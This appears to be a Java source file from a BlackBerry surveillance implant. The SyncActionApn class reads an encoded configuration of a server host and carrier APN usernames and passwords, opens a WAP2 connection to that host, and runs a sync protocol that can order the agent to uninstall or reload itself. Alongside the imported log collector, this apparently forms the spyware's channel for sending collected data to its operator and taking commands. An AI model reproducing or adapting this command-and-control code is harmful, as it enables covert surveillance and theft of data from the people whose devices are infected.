//#preprocess
package blackberry.action.sync;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.action.Apn;
import blackberry.action.SyncAction;
import blackberry.action.SyncActionInternet;
import blackberry.action.sync.protocol.ZProtocol;
import blackberry.action.sync.transport.ApnTransport;
import blackberry.action.sync.transport.Wap2Transport;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.transfer.ProtocolException;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;
import blackberry.utils.WChar;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE);
    //#endif

    String host;
    int port = 80;

    public SyncActionApn(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);

        protocol = new ZProtocol();

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
        //#endif
    }

    protected boolean parse(final byte[] confParams) {

        Vector apns = new Vector();

        //#ifdef DBC
        Check.requires(apns != null, "parse: apns null");
        //#endif

        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            final int hostLen = databuffer.readInt();
            final byte[] hostRaw = new byte[hostLen];

            databuffer.readFully(hostRaw);
            host = WChar.getString(hostRaw, true);

            //#ifdef DEBUG
            debug.trace("host: " + host);
            //#endif

            final int entries = databuffer.readInt(); // readByte();

            int len;
            byte[] stringRaw;

            for (int i = 0; i < entries; i++) {
                final Apn apn = new Apn();
                apn.mcc = databuffer.readInt(); // readShort();
                apn.mnc = databuffer.readInt(); // readShort();

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.apn = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); // readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.user = WChar.getString(stringRaw, true);

                len = databuffer.readInt(); //readShort();
                stringRaw = new byte[len];
                databuffer.readFully(stringRaw);
                apn.pass = WChar.getString(stringRaw, true);

                //#ifdef DEBUG
                debug.trace("adding apn: " + apn);
                //#endif
                apns.addElement(apn);
            }

            //#ifdef DBC
            Check.ensures(apns.size() == entries, "parse apns entries");
            //#endif

            if (entries == 0) {
                transport = new Wap2Transport(host, port);
            } else {
                transport = new Wap2Transport(host, port);
                //transport = new ApnTransport(host, port, apns);
            }

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }
        return true;
    }

    public String toString() {
        return "SyncApn " + transport;
    }

    public boolean execute(Event event) {
        //#ifdef DBC
        Check.requires(protocol != null, "execute: null protocol");
        Check.requires(transport != null, "execute: null transport");
        //#endif
        
        if (transport.isAvailable()) {
            //#ifdef DEBUG
            debug.trace("execute: transport available");
            //#endif
            protocol.init(transport);
            boolean ret;
            try {
                ret = protocol.start();
                wantUninstall = protocol.uninstall;
                wantReload = protocol.reload;
            } catch (ProtocolException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif
                return false;
            }
            
            //#ifdef DEBUG
            debug.trace("execute protocol: " + ret);
            //#endif
            
            return ret;
        }else{
            //#ifdef DEBUG
            debug.trace("execute: transport not available");
            //#endif

        }
        return false;
    }
}
